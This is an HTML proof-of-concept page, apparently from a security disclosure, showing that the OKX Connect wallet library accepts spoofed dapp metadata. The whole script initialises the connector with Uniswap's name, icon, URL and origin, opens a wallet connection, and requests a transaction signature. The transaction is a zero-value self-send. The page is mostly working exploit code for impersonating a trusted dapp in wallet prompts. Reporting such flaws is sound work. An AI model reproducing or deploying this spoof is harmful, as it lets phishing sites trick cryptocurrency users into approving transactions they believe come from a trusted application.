  body{font-family:system-ui,sans-serif;max-width:720px;margin:24px auto;padding:0 16px;line-height:1.5}

<body>
<h2>PoC #2 — OKX Connect DAppInfo spoof</h2>


<button id="connect">Connect via OKX</button>
<pre id="out">—</pre>

<script type="module">
import { OKXUniversalConnectUI } from 'https://esm.sh/@okxconnect/ui@1';

const out = document.getElementById('out');
const log = (m)=> out.textContent = (typeof m==='string'? m : JSON.stringify(m,null,2));
const CHAIN = 'eip155:1';

document.getElementById('connect').onclick = async () => {
  const ui = await OKXUniversalConnectUI.init({
    dappMetaData: {
      name: 'Uniswap',
      icon: 'https://app.uniswap.org/favicon.png',
      url:  'https://app.uniswap.org',    
      origin: 'https://app.uniswap.org'    
    },
    uiPreferences: { theme: 'SYSTEM' }
  });

  try {
    const session = await ui.openModal({
      namespaces: { eip155: { chains: [CHAIN], rpcMap: { 1: 'https://cloudflare-eth.com' }, defaultChain: '1' } }
    });
    const account = (session?.namespaces?.eip155?.accounts?.[0] || '').split(':').pop();
    const tx = { from: account, to: account, value: '0x0', data: '0x' };
    const hash = await ui.request({ method: 'eth_sendTransaction', params: [tx] }, CHAIN);
  } catch (e) { 
  }
};
</script>
